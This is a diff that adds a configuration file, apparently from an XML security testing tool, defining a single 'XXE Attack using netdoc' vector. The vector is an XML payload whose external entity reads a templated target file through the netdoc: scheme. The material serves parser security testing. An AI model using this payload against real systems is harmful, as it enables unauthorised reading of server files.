@@ -1,0 +1,18 @@
+<config>
+<name>XXE Attack using netdoc</name>
+<description>...</description>
+<params>
+    <dosbox>false</dosbox>
+    <targetFile>true</targetFile>
+    <helperURL>false</helperURL>
+    <attackListenerURL>false</attackListenerURL>
+</params>
+<attackvectors>
+<attackvector><![CDATA[<?xml version="1.0"?>
+<!DOCTYPE data [
+<!ELEMENT data (#PCDATA)>
+<!ENTITY file SYSTEM "netdoc:§tf_targetFILE§">
+]>
+<data>&file;</data>]]></attackvector>
+</attackvectors>
+</config>
